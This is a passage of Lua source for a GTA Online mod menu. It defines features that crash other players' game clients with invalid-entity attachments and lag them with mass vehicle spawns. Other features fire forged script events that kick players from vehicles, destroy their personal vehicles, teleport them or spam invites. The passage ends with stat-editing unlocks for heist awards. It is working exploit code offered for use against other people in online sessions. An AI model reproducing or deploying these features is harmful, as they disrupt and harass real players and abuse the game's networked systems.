    local playerped3 = player.get_player_ped(pid)
    local pos = v3()
    fire.add_explosion(pos1, 8, true, false, 1, pid)
    attach_object1132 = object.create_object(-1065766299, pos, true, false)
    entity.attach_entity_to_entity(attach_object1132, playerped3, 0, pos, pos, true, true, false, 0, false)
    entity.set_entity_visible(attach_object1132, false)

    attach_object1133 = object.create_object(-105439435, pos, true, false)
    entity.attach_entity_to_entity(attach_object1133, playerped3, 0, pos, pos, true, true, false, 0, false)
    entity.set_entity_visible(attach_object1133, false)
    end)

menu.add_player_feature("Apartment Invite Loop", "toggle", at0mic.id, function(feat, pid)
    if feat.on then
        system.wait(2)
        script.trigger_script_event(-171207973, pid, {-1, 0})
        script.trigger_script_event(1114696351, pid, {-1, 0})
        script.trigger_script_event(2027212960, pid, {-1, 0})
        script.trigger_script_event(0xf5cb92db, pid, {-1, 0})
        script.trigger_script_event(0x4270ea9f, pid, {-1, 0})
        script.trigger_script_event(0x78d4d0a0, pid, {-1, 0})
        script.trigger_script_event(0xf5cb92db, pid, {-171207973})
        script.trigger_script_event(0x4270ea9f, pid, {1114696351})
        script.trigger_script_event(0x78d4d0a0, pid, {2027212960})
    end

return HANDLER_CONTINUE
end)

menu.add_player_feature("Send To Island Loop", "toggle", at0mic.id, function(feat, pid)
    if feat.on then
        system.wait(2)
        script.trigger_script_event(0x4d8b1e65, pid, {-1, 0})
        script.trigger_script_event(1300962917, pid, {-1, 0})
     end
return HANDLER_CONTINUE
end)

menu.add_player_feature("Destroy Personal Vehicle Loop", "toggle", at0mic.id, function(feat, pid)
    if feat.on then
        system.wait(2)
        script.trigger_script_event(-1662268941, pid, {-1, 0})
    end

return HANDLER_CONTINUE
end)


menu.add_player_feature("Give OTR Loop", "action", at0mic.id, function(playerfeat, pid)
if feat.on then
        system.wait(2)
                    script.trigger_script_event(575518757, pid, {pid, utils.time() - 60, utils.time(), 1, 1, arg11(pid)})
                    script.trigger_script_event(575518757, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
                    script.trigger_script_event(575518757, pid, args())
                    script.trigger_script_event(575518757, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
                    script.trigger_script_event(575518757, pid, args())
                    script.trigger_script_event(575518757, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
 end

return HANDLER_CONTINUE
end)


    menu.add_player_feature("Give never wanted", "toggle", at0mic.id, function(feat, pid)
                        if feat.on then
                            script.trigger_script_event(393068387, pid, {pid, arg11(pid)})
                            script.trigger_script_event(393068387, pid, {pid, arg11(pid)})
                            script.trigger_script_event(393068387, pid, {pid, arg11(pid)})
                            script.trigger_script_event(393068387, pid, {pid, arg11(pid)})
                            script.trigger_script_event(393068387, pid, {pid, arg11(pid)})
                            script.trigger_script_event(393068387, pid, {pid, arg11(pid)})
                        end
                        system.wait(700)
                        return HANDLER_CONTINUE
                    end)


menu.add_player_feature("Give vehicle godmode", "action", at0mic.id, function(playerfeat, pid)
local activveee = player.is_player_in_any_vehicle(pid)
if activveee == true then
local car = player.get_player_vehicle(pid)
for i = 1, 100 do
network.request_control_of_entity(car)
end
entity.set_entity_god_mode(car, true)
network.request_control_of_entity(car)
entity.set_entity_god_mode(car, true)
entity.set_entity_god_mode(car, true)
end
end)

menu.add_player_feature("Lag with Cargos", "toggle", at0mic.id, function(feat, pid)                                                                                                                                                                                                                                                            
if feat.on then
    local pos = player.get_player_coords(pid)
    local veh_hash = 0x15F27762

streaming.request_model(veh_hash)
while (not streaming.has_model_loaded(veh_hash)) do
system.wait(10)
end

local tableOfVehicles = {}
for i = 1, 75 do
tableOfVehicles[#tableOfVehicles + 1] = vehicle.create_vehicle(veh_hash, pos, pos.z, true, false)
end
system.wait(1000)
for i = 1, #tableOfVehicles do
entity.delete_entity(tableOfVehicles[i])
end
tableOfVehicles = {}

streaming.set_model_as_no_longer_needed(veh_hash)



    end
return HANDLER_CONTINUE
end)

menu.add_player_feature("Lag with Subs", "toggle", at0mic.id, function(feat, pid)                                                                                                                                                                                                                                                            
if feat.on then
    local pos = player.get_player_coords(pid)
    local veh_hash = 0x4FAF0D70

streaming.request_model(veh_hash)
while (not streaming.has_model_loaded(veh_hash)) do
system.wait(10)
end


local tableOfVehicles = {}
for i = 1, 75 do
tableOfVehicles[#tableOfVehicles + 1] = vehicle.create_vehicle(veh_hash, pos, pos.z, true, false)
end
system.wait(1000)
for i = 1, #tableOfVehicles do
entity.delete_entity(tableOfVehicles[i])
end
tableOfVehicles = {}

streaming.set_model_as_no_longer_needed(veh_hash)


    end
return HANDLER_CONTINUE
end)

menu.add_player_feature("Lag with Dump Trucks", "toggle", at0mic.id, function(feat, pid)                                                                                                                                                                                                                                                            
if feat.on then
    local pos = player.get_player_coords(pid)
    local veh_hash = 0x810369E2 

streaming.request_model(veh_hash)
while (not streaming.has_model_loaded(veh_hash)) do
system.wait(10)
end


local tableOfVehicles = {}
for i = 1, 75 do
tableOfVehicles[#tableOfVehicles + 1] = vehicle.create_vehicle(veh_hash, pos, pos.z, true, false)
end
system.wait(1000)
for i = 1, #tableOfVehicles do
entity.delete_entity(tableOfVehicles[i])
end
tableOfVehicles = {}

streaming.set_model_as_no_longer_needed(veh_hash)


    end
return HANDLER_CONTINUE
end)


menu.add_player_feature("Old Invalid Entity Crash ", "action", at0mic.id, function(feat, pid)

    local function createped(type, hash, pos, dir)
        streaming.request_model(hash)
        while not streaming.has_model_loaded(hash) do
        system.wait(10)
        end
        local ped = ped.create_ped(type, hash, pos, dir, true, false)
            streaming.set_model_as_no_longer_needed(hash)
            return ped
        end
pos = player.get_player_coords(pid)
local pedp = player.get_player_ped(pid)
pos.z = pos.z + 0.6

npc1 = createped(26,0x2D7030F3,pos,0)
entity.attach_entity_to_entity(npc1,pedp, 0, v3(0.30,0,0.0),v3(0.0,0,0.0), true, true, false, 0, true)
entity.freeze_entity(npc1, true)
local checkcount = 0
network.request_control_of_entity(npc1)
  while not network.has_control_of_entity(npc1) do
    system.wait(100)
    checkcount = checkcount + 1
    if checkcount > 10 then end
  end
   system.wait(2000)
entity.delete_entity(npc1)

npc2 = createped(26,0x856CFB02,pos,0)
entity.attach_entity_to_entity(npc2,pedp, 0, v3(0.30,0,0.0),v3(0.0,0,0.0), true, true, false, 0, true)
entity.freeze_entity(npc2, true)
local checkcount = 0
network.request_control_of_entity(npc2)
  while not network.has_control_of_entity(npc2) do
    system.wait(2000)
    checkcount = checkcount + 1
    if checkcount > 10 then end
  end
   system.wait(2000)
entity.delete_entity(npc2)

npc3 = createped(26,0x856CFB02,pos,0)
entity.attach_entity_to_entity(npc3,pedp, 0, v3(0.30,0,0.0),v3(0.0,0,0.0), true, true, false, 0, true)
entity.freeze_entity(npc3, true)
local checkcount = 0
network.request_control_of_entity(npc3)
  while not network.has_control_of_entity(npc3) do
    system.wait(100)
    checkcount = checkcount + 1
    if checkcount > 10 then end
  end
    system.wait(2000)
entity.delete_entity(npc3)
end)


menu.add_player_feature("New Invalid Entity Crash ", "action", at0mic.id, function(feat, pid)

local function createped(type, hash, pos, dir)
    streaming.request_model(hash)
    while not streaming.has_model_loaded(hash) do
    system.wait(10)
    end
    local ped = ped.create_ped(type, hash, pos, dir, true, false)
        streaming.set_model_as_no_longer_needed(hash)
        return ped
    end
pos = player.get_player_coords(pid)
local pedp = player.get_player_ped(pid)
pos.z = pos.z + 0.6

npc1 = createped(26,0x2D7030F3,pos,0)
entity.attach_entity_to_entity(npc1,pedp, 0, v3(0.30,0,0.0),v3(0.0,0,0.0), true, true, false, 0, true)
entity.freeze_entity(npc1, true)
local checkcount = 0
network.request_control_of_entity(npc1)
while not network.has_control_of_entity(npc1) do
system.wait(100)
checkcount = checkcount + 1
if checkcount > 10 then end
end
system.wait(2000)
entity.delete_entity(npc1)

npc2 = createped(26,0x856CFB02,pos,0)
entity.attach_entity_to_entity(npc2,pedp, 0, v3(0.30,0,0.0),v3(0.0,0,0.0), true, true, false, 0, true)
entity.freeze_entity(npc2, true)
local checkcount = 0
network.request_control_of_entity(npc2)
while not network.has_control_of_entity(npc2) do
system.wait(2000)
checkcount = checkcount + 1
if checkcount > 10 then end
end
system.wait(2000)
entity.delete_entity(npc2)

npc3 = createped(26,0x856CFB02,pos,0)
entity.attach_entity_to_entity(npc3,pedp, 0, v3(0.30,0,0.0),v3(0.0,0,0.0), true, true, false, 0, true)
entity.freeze_entity(npc3, true)
local checkcount = 0
network.request_control_of_entity(npc3)
while not network.has_control_of_entity(npc3) do
system.wait(100)
checkcount = checkcount + 1
if checkcount > 10 then end
end
system.wait(2000)
entity.delete_entity(npc3)
end)

------------------------ ATOMIC STUFF ABOVE --------------------------------
------------------------ VEHICLE STUFF BELOW -------------------------------
menu.add_feature("Kick everyone from vehicle", "action", Cars11.id, function(playerfeat, pid)
    for pid = 1,32 do
        if pid ~= me then
            for o = 1,2 do
                ui.set_text_color(0, 217, 255, 255)					
                ui.set_text_scale(0.5)
                ui.set_text_font(0)
                ui.set_text_centre(true)
                ui.set_text_outline(true)
                ui.draw_text("sent it "..pid.." times",v2(0.93, 0.47))
    ui.set_text_font(1)
    system.wait(0)
    end
    script.trigger_script_event(1333236192, pid, args())
    script.trigger_script_event(1333236192, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
    script.trigger_script_event(1333236192, pid, {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 0})
    script.trigger_script_event(1333236192, pid, {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 0})  
    script.trigger_script_event(1333236192, pid, {0, 0, 46190868, 0, 2})
    script.trigger_script_event(0xB0886E20, pid, {46190868, 0, 46190868, 46190868, 2})
    script.trigger_script_event(1333236192, pid, {0, 0, 46190868, 0, 2})
    script.trigger_script_event(1333236192, pid, {46190868, 0, 46190868, 46190868, 2})
    script.trigger_script_event(1333236192, pid, {1337, -1, 1, 1, 0, 0, 0})
    script.trigger_script_event(0xB0886E20, pid, {1337, 1337, -1, 1, 1, 0, 0, 0})
    script.trigger_script_event(1333236192, pid, {0}) 
end
end

    end)


    menu.add_feature("Destroy everyones personal vehicles", "action", Cars11.id, function(playerfeat, pid)
        for pid = 1,32 do
            if pid ~= me then
                for o = 1,2 do
                    ui.set_text_color(0, 217, 255, 255)					
                    ui.set_text_scale(0.5)
                    ui.set_text_font(0)
                    ui.set_text_centre(true)
                    ui.set_text_outline(true)
                    ui.draw_text("sended it "..pid.." times",v2(0.93, 0.47))
        ui.set_text_font(1)
        system.wait(0)
        end
        script.trigger_script_event(1662268941, pid, {pid, pid})
        script.trigger_script_event(1662268941, pid, {pid, pid})
        script.trigger_script_event(1662268941, pid, {pid, pid})
        script.trigger_script_event(1662268941, pid, {pid, pid})
        script.trigger_script_event(1662268941, pid, {pid, pid})
        script.trigger_script_event(830707189, pid, {pid, pid})
        script.trigger_script_event(830707189, pid, {pid, pid})
        script.trigger_script_event(830707189, pid, {pid, pid})
        script.trigger_script_event(830707189, pid, {pid, pid})
        script.trigger_script_event(0x9CEBC9F3, pid, {pid, pid})
        script.trigger_script_event(0x9CEBC9F3, pid, {pid, pid})
        script.trigger_script_event(1662268941, pid, {pid, pid})
        script.trigger_script_event(0x9CEBC9F3, pid, {pid, pid})
                script.trigger_script_event(-1662268941, pid, args())
        script.trigger_script_event(1662268941, pid, {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 0})
        script.trigger_script_event(1662268941, pid, {-1, -1, -1, -1, -1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 0})
        script.trigger_script_event(1662268941, pid, {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 0})  
        script.trigger_script_event(1662268941, pid, {0, 0, 46190868, 0, 2})
        script.trigger_script_event(1662268941, pid, {46190868, 0, 46190868, 46190868, 2})
        script.trigger_script_event(1662268941, pid, {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 0})
        script.trigger_script_event(1662268941, pid, {-1, -1, -1, -1, -1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 0})
        script.trigger_script_event(1662268941, pid, {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 0})
        script.trigger_script_event(1662268941, pid, {0})
        script.trigger_script_event(1662268941, pid, {0})
        script.trigger_script_event(1662268941, pid, {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 0})
        script.trigger_script_event(1662268941, pid, {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 0})
        script.trigger_script_event(1662268941, pid, {-1, -1, -1, -1, -1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 0})
        script.trigger_script_event(1662268941, pid, {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 0})  
        script.trigger_script_event(1662268941, pid, {0, 0, 46190868, 0, 2})
        script.trigger_script_event(1662268941, pid, {46190868, 0, 46190868, 46190868, 2})
        script.trigger_script_event(1662268941, pid, {1337, -1, 1, 1, 0, 0, 0})
        script.trigger_script_event(1662268941, pid, {1337, 1337, -1, 1, 1, 0, 0, 0})
        script.trigger_script_event(1662268941, pid, {0}) 
        script.trigger_script_event(0x9CEBC9F3, pid, {pid, pid})
        script.trigger_script_event(0x9CEBC9F3, pid, {pid, pid})
        script.trigger_script_event(0x9CEBC9F3, pid, {pid, pid})
        script.trigger_script_event(0x9CEBC9F3, pid, {pid, pid})
        script.trigger_script_event(0x9CEBC9F3, pid, {pid, pid})
        script.trigger_script_event(0x9CEBC9F3, pid, {pid, pid})
        script.trigger_script_event(0x9CEBC9F3, pid, {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 0})
        script.trigger_script_event(0x9CEBC9F3, pid, {-1, -1, -1, -1, -1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 0})
script.trigger_script_event(0x9CEBC9F3, pid, {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 0})  
script.trigger_script_event(0x9CEBC9F3, pid, {0, 0, 46190868, 0, 2})
script.trigger_script_event(0x9CEBC9F3, pid, {46190868, 0, 46190868, 46190868, 2})
script.trigger_script_event(0x9CEBC9F3, pid, {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 0})
script.trigger_script_event(0x9CEBC9F3, pid, {-1, -1, -1, -1, -1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 0})
script.trigger_script_event(0x9CEBC9F3, pid, {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 0})
script.trigger_script_event(0x9CEBC9F3, pid, {0})
script.trigger_script_event(0x9CEBC9F3, pid, {0})
script.trigger_script_event(0x9CEBC9F3, pid, {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 0})
script.trigger_script_event(0x9CEBC9F3, pid, {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 0})
script.trigger_script_event(0x9CEBC9F3, pid, {-1, -1, -1, -1, -1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 0})
script.trigger_script_event(0x9CEBC9F3, pid, {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 0})  
script.trigger_script_event(0x9CEBC9F3, pid, {0, 0, 46190868, 0, 2})
script.trigger_script_event(0x9CEBC9F3, pid, {46190868, 0, 46190868, 46190868, 2})
script.trigger_script_event(0x9CEBC9F3, pid, {1337, -1, 1, 1, 0, 0, 0})
script.trigger_script_event(0x9CEBC9F3, pid, {1337, 1337, -1, 1, 1, 0, 0, 0})
script.trigger_script_event(0x9CEBC9F3, pid, {0}) 
        script.trigger_script_event(830707189, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
        script.trigger_script_event(-1662268941, pid, args())
        script.trigger_script_event(830707189, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
    end
    end
    
        end)

-- Turn off engine of player's vehicle
menu.add_player_feature("Turn Vehicle Engine Off", "action", Cars11.id, function(playerfeat, pid)
    local player_veh = ped.get_vehicle_ped_is_using(player.get_player_ped(pid))
    if (player.is_player_in_any_vehicle(pid)) then
        menu.notify("Turned the engine in " .. player.get_player_name(pid) .. "'s " .. vehicle.get_vehicle_model(player_veh) .. " off.", "", 10, 2)
        vehicle.set_vehicle_engine_on(player_veh, false, true, true)
        --set_vehicle_engine_on(Vehicle veh, bool toggle, bool instant, bool noAutoTurnOn)
        --ped.clear_ped_tasks_immediately(player.get_player_ped(pid))
    else
        menu.notify(player.get_player_name(pid) .. " is not in a vehicle", "", 10, 2)
    end
end)

-- Vehicle kick loop
menu.add_player_feature("Vehicle Kick Loop", "toggle", Cars11.id, function(playerfeat_toggle, pid)
    while (playerfeat_toggle.on) do
        local player_veh = ped.get_vehicle_ped_is_using(player.get_player_ped(pid))
        if (player.is_player_in_any_vehicle(pid)) then
            menu.notify("Kicking " .. player.get_player_name(pid) .. " out of their " .. vehicle.get_vehicle_model(player_veh), "", 10, 2)
            ped.clear_ped_tasks_immediately(player.get_player_ped(pid))
        else
            menu.notify(player.get_player_name(pid) .. " is not in a vehicle", "", 10, 2)
        end
        system.wait(5000)
    end
end)

-- Random engine shutdowns
menu.add_player_feature("Random Engine Shutdowns", "toggle", Cars11.id, function(playerfeat_toggle, pid)
    while (playerfeat_toggle.on) do
        local player_veh = ped.get_vehicle_ped_is_using(player.get_player_ped(pid))
        if (player.is_player_in_any_vehicle(pid)) then
            menu.notify("Turned the engine in " .. player.get_player_name(pid) .. "'s " .. vehicle.get_vehicle_model(player_veh) .. " off.", "", 10, 2)
            vehicle.set_vehicle_engine_on(player_veh, false, true, true)
            --set_vehicle_engine_on(Vehicle veh, bool toggle, bool instant, bool noAutoTurnOn)
            --ped.clear_ped_tasks_immediately(player.get_player_ped(pid))
        else
            menu.notify(player.get_player_name(pid) .. " is not in a vehicle", "", 10, 2)
        end
        
        system.wait(math.random(5, 15) * 1000)
    end
end)


        menu.add_player_feature("shoot car forward", "action", Cars11.id, function(feat, pid)
            local activveee = player.is_player_in_any_vehicle(pid)
            if activveee == true then
            menu.set_menu_can_navigate(false)
              local car = player.get_player_vehicle(pid)
              network.request_control_of_entity(car)
              for i = 1, 100 do
                  network.request_control_of_entity(car)
              end
              network.request_control_of_entity(car)
              vehicle.modify_vehicle_top_speed(car, 500)
              entity.set_entity_max_speed(car, 500)
              vehicle.modify_vehicle_top_speed(car, 500)
              entity.set_entity_max_speed(car, 500)
              vehicle.set_vehicle_forward_speed(car, 110)
              vehicle.set_vehicle_forward_speed(car, 110)
              vehicle.set_vehicle_forward_speed(car, 110)
              for i = 1, 100 do
                  network.request_control_of_entity(car)
              end
              vehicle.set_vehicle_forward_speed(car, 110)
              vehicle.set_vehicle_forward_speed(car, 110)
              vehicle.set_vehicle_forward_speed(car, 110)
              vehicle.set_vehicle_forward_speed(car, 110)
              vehicle.set_vehicle_forward_speed(car, 110)
              vehicle.set_vehicle_forward_speed(car, 110)
              vehicle.set_vehicle_forward_speed(car, 110)
              vehicle.set_vehicle_forward_speed(car, 110)
              system.wait(5)
              vehicle.set_vehicle_forward_speed(car, 110)
              vehicle.set_vehicle_forward_speed(car, 110)
              vehicle.set_vehicle_forward_speed(car, 110)
              vehicle.set_vehicle_forward_speed(car, 110)
              vehicle.set_vehicle_forward_speed(car, 110)
              vehicle.set_vehicle_forward_speed(car, 110)
              vehicle.set_vehicle_forward_speed(car, 110)
              menu.set_menu_can_navigate(true)
            end
          end)

          menu.add_player_feature("Set vehicle stolen", "action", Cars11.id, function(playerfeat, pid)
            local activveee = player.is_player_in_any_vehicle(pid)
            if activveee == true then
            menu.set_menu_can_navigate(false)
              local player1car = player.get_player_vehicle(pid)
              for i = 1, 100 do
              network.request_control_of_entity(player1car)
              end
              vehicle.set_vehicle_stolen(player1car, true)
              network.request_control_of_entity(player1car)
              vehicle.set_vehicle_stolen(player1car, true)
              system.yield(2000)
              network.request_control_of_entity(player1car)
              vehicle.set_vehicle_stolen(player1car, true)
              vehicle.set_vehicle_stolen(player1car, true)
              menu.set_menu_can_navigate(true)
            end
          end)

          menu.add_player_feature("Kill the driver", "toggle", Cars11.id, function(playerfeat, pid)
            if playerfeat.on then
              local activveee = player.is_player_in_any_vehicle(pid)
              if activveee == true then
            local player1car = player.get_player_vehicle(pid)
            network.request_control_of_entity(player1car)
            network.request_control_of_entity(player1car)
            network.request_control_of_entity(player1car)
            if network.has_control_of_entity(player1car) == true then
            
            vehicle.set_vehicle_out_of_control(player1car, true, true)
            
            network.request_control_of_entity(player1car)
            vehicle.set_vehicle_out_of_control(player1car, true, true)
            vehicle.set_vehicle_out_of_control(player1car, true, true)
            
            network.request_control_of_entity(player1car)
            vehicle.set_vehicle_out_of_control(player1car, true, true)
            vehicle.set_vehicle_out_of_control(player1car, true, true)
            
            network.request_control_of_entity(player1car)
            vehicle.set_vehicle_out_of_control(player1car, true, true)
            vehicle.set_vehicle_out_of_control(player1car, true, true)
            network.request_control_of_entity(player1car)
           
            vehicle.set_vehicle_out_of_control(player1car, true, true)
        else
            network.request_control_of_entity(player1car)
            
        end
        end
        system.wait(1)
            return HANDLER_CONTINUE
            end
        end)
        
        menu.add_player_feature("Make car weird", "toggle", Cars11.id, function(playerfeat, pid)
            if playerfeat.on then
              local activveee = player.is_player_in_any_vehicle(pid)
              if activveee == true then
            local player1car = player.get_player_vehicle(pid)
            network.request_control_of_entity(player1car)
            if network.has_control_of_entity(player1car) == true then
            network.request_control_of_entity(player1car)
        
            
            vehicle.set_vehicle_out_of_control(player1car, false, true)
            system.yield(100)
            network.request_control_of_entity(player1car)
            vehicle.set_vehicle_stolen(player1car, true)
            vehicle.set_vehicle_stolen(player1car, true)
            vehicle.set_vehicle_out_of_control(player1car, false, true)
            network.request_control_of_entity(player1car)
        
            network.request_control_of_entity(player1car)
            vehicle.set_vehicle_engine_health(player1car, 0)
        
            vehicle.set_vehicle_engine_health(player1car, -1000)
            else
                network.request_control_of_entity(player1car)
                
            end
          end
            return HANDLER_CONTINUE
            end
        end)
        
        menu.add_player_feature("Burn the car", "toggle", Cars11.id, function(playerfeat, pid)
            if playerfeat.on then
              local activveee = player.is_player_in_any_vehicle(pid)
              if activveee == true then
            local player1car = player.get_player_vehicle(pid)
            network.request_control_of_entity(player1car)
            if network.has_control_of_entity(player1car) == true then
            network.request_control_of_entity(player1car)
            vehicle.set_vehicle_doors_locked_for_all_players(player1car, true)
            system.yield(100)
            network.request_control_of_entity(player1car)
            network.request_control_of_entity(player1car)
            vehicle.set_vehicle_doors_locked_for_all_players(player1car, true)
            network.request_control_of_entity(player1car)
            vehicle.set_vehicle_engine_health(player1car, 0)
        
            vehicle.set_vehicle_engine_health(player1car, -1000)
            vehicle.set_vehicle_doors_locked_for_all_players(player1car, true)
            vehicle.set_vehicle_doors_locked_for_all_players(player1car, true)
            vehicle.set_vehicle_doors_locked_for_all_players(player1car, true)
            vehicle.set_vehicle_engine_health(player1car, 0)
        
            vehicle.set_vehicle_engine_health(player1car, -1000)
            else
                network.request_control_of_entity(player1car)
                network.request_control_of_entity(player1car)
                network.request_control_of_entity(player1car)
                
            end
          end
            return HANDLER_CONTINUE
            end
        end)
        
        menu.add_player_feature("Burn the car and kill the driver", "toggle", Cars11.id, function(playerfeat, pid)
            if playerfeat.on then
              local activveee = player.is_player_in_any_vehicle(pid)
              if activveee == true then
            local player1car = player.get_player_vehicle(pid)
            network.request_control_of_entity(player1car)
            if network.has_control_of_entity(player1car) == true then
            network.request_control_of_entity(player1car)
            vehicle.set_vehicle_doors_locked_for_all_players(player1car, true)
            system.yield(100)
            network.request_control_of_entity(player1car)
            network.request_control_of_entity(player1car)
            vehicle.set_vehicle_doors_locked_for_all_players(player1car, true)
            network.request_control_of_entity(player1car)
                
            vehicle.set_vehicle_out_of_control(player1car, true, true)
            
            network.request_control_of_entity(player1car)
            vehicle.set_vehicle_out_of_control(player1car, true, true)
            vehicle.set_vehicle_out_of_control(player1car, true, true)
            
            network.request_control_of_entity(player1car)
            vehicle.set_vehicle_out_of_control(player1car, true, true)
            vehicle.set_vehicle_out_of_control(player1car, true, true)
            vehicle.set_vehicle_engine_health(player1car, 0)
        
            vehicle.set_vehicle_engine_health(player1car, -1000)
            network.request_control_of_entity(player1car)
            vehicle.set_vehicle_out_of_control(player1car, true, true)
            vehicle.set_vehicle_out_of_control(player1car, true, true)
            network.request_control_of_entity(player1car)
           
            vehicle.set_vehicle_out_of_control(player1car, true, true)
            vehicle.set_vehicle_engine_health(player1car, 0)
        
            vehicle.set_vehicle_engine_health(player1car, -1000)
            vehicle.set_vehicle_doors_locked_for_all_players(player1car, true)
            vehicle.set_vehicle_doors_locked_for_all_players(player1car, true)
            vehicle.set_vehicle_doors_locked_for_all_players(player1car, true)
            vehicle.set_vehicle_engine_health(player1car, 0)
        
            vehicle.set_vehicle_engine_health(player1car, -1000)
            else
                network.request_control_of_entity(player1car)
                network.request_control_of_entity(player1car)
                network.request_control_of_entity(player1car)
                
            end
          end
            return HANDLER_CONTINUE
            end
        end)

        menu.add_player_feature("disable player vehicle (you have to be close)", "toggle", Cars11.id, function(feat, pid)
            if feat.on then
                if pid ~= me then
                    local activ = player.is_player_pressing_horn(pid)
                    if activ == true then
            local player1car = player.get_player_vehicle(pid)
            network.request_control_of_entity(player1car)
            script.trigger_script_event(-152440739, pid, {0})
            script.trigger_script_event(-152440739, pid, {pid, script.get_global_i(1630317 + (1 + (pid * 595)) + 506)})
            
            vehicle.set_vehicle_engine_health(player1car, 0)
        
            vehicle.set_vehicle_engine_health(player1car, 0)
            system.yield(2000)
           
            vehicle.set_vehicle_engine_health(player1car, -100)
        
            vehicle.set_vehicle_engine_health(player1car, -100)
                    end
                end
            end
        return HANDLER_CONTINUE
        end)

---------------- vehicle stuff above --------------------------------------
---------------- recovery stuff below----------------------------------------
menu.add_feature("Unlock High-End Apartment Heist Awards", "action", lobbrecovery.id, function(feat, pid)
    menu.notify("High-End Apartment Awards Unlocked!", "Unknown's Unlocker", 4, 257818)
    for i = 1, #APRTMNT_AWD_I do
        stat_set_int(APRTMNT_AWD_I[i][1], true, APRTMNT_AWD_I[i][2])
        stat_set_int(APRTMNT_AWD_I[i][1], false, APRTMNT_AWD_I[i][2])
    for i = 1, #APRTMNT_AWD_B do
        stat_set_bool(APRTMNT_AWD_B[i][1], true, APRTMNT_AWD_B[i][2])
        stat_set_bool(APRTMNT_AWD_B[i][1], false, APRTMNT_AWD_B[i][2])
        end
    end
end)

menu.add_feature("Unlock Doomsday Heist Awards", "action", lobbrecovery.id, function(feat, pid)
    menu.notify("Doomsday Awards Unlocked!", "Unknown's Unlocker", 4, 257818)
    for i = 1, #DD_AWARDS_I do
        stat_set_int(DD_AWARDS_I[i][1], true, DD_AWARDS_I[i][2])
        stat_set_int(DD_AWARDS_I[i][1], false, DD_AWARDS_I[i][2])
    end
    for i = 2, #DD_AWARDS_B do
        stat_set_bool(DD_AWARDS_B[i][1], true, DD_AWARDS_B[i][2])
        stat_set_bool(DD_AWARDS_B[i][1], false, DD_AWARDS_B[i][2])
    end
end)
menu.add_feature("Unlock All Doomsday Heist", "action", lobbrecovery.id, function(feat, pid)
    menu.notify("Call Lester and ask to cancel the Doomsday Heist (Three Times)\nDo this only once", "Unknown's Unlocker", 6, 780000)
    for i = 1, #DD_H_ULCK do
        stat_set_int(DD_H_ULCK[i][1], true, DD_H_ULCK[i][2])
    end
end)
menu.add_feature("Unlock Cayo Perico Awards", "action", lobbrecovery.id, function(feat, pid)
    menu.notify("Cayo Perico Awards Unlocked!", "Unknown's Unlocker", 5, 257818)
    for i = 1, #CP_AWRD_IT do
        stat_set_int(CP_AWRD_IT[i][1], true, CP_AWRD_IT[i][2])
    for i = 2, #CP_AWRD_BL do
        stat_set_bool(CP_AWRD_BL[i][1], true, CP_AWRD_BL[i][2])
        end
    end
end)
menu.add_feature("Unlock Casino Awards", "action", lobbrecovery.id, function(feat, pid)
    menu.notify("Casino Heist Awards Unlocked!", "Unknown's Unlocker", 4, 257818)
    for i = 1, #CH_AWRD_IT do
        stat_set_int(CH_AWRD_IT[i][1], true, CH_AWRD_IT[i][2])
    for i = 2, #CH_AWRD_BL do
        stat_set_bool(CH_AWRD_BL[i][1], true, CH_AWRD_BL[i][2])
        end
    end
end)
   
menu.add_feature("Trigger Alien Egg Mission", "action", lobbrecovery.id, function(feat, pid)
    menu.notify("Change the clock time to between 9pm and 11pm", "Unknown's Unlocker", 4, 257818)
    for i = 1, #ALN_EG_MS do
        stat_set_int(ALN_EG_MS[i][1], true, ALN_EG_MS[i][2])
    end
end)
menu.add_feature("Unlock Bunker Awards", "action", lobbrecovery.id, function(feat, pid)
    menu.notify("Bunker Awards Unlocked!", "Unknown's Unlocker", 4, 257818)
    for i = 1, #BUNKR_UNLCK do
        stat_set_int(BUNKR_UNLCK[i][1], true, BUNKR_UNLCK[i][2])
    for i = 2, #BUNKR_UNLCK_B do
        stat_set_bool(BUNKR_UNLCK_B[i][1], true, BUNKR_UNLCK_B[i][2])
        end
    end
end)
    
menu.add_feature("Unlock Nightclub Awards", "action", lobbrecovery.id, function(feat, pid)
    menu.notify("Nightclub Awards Unlocked", "Unknown's Unlocker", 4, 257818)
    for i = 1, #NIGH_C_UNLK do
        stat_set_int(NIGH_C_UNLK[i][1], true, NIGH_C_UNLK[i][2])
    for i = 2, #NIGH_C_UNLK_B do
        stat_set_bool(NIGH_C_UNLK_B[i][1], true, NIGH_C_UNLK_B[i][2])
        stat_set_bool(NIGH_C_UNLK_B[i][1], false, NIGH_C_UNLK_B[i][2])
        end
    end
end)
    
menu.add_feature("Unlock Awards", "action", lobbrecovery.id, function(feat, pid)
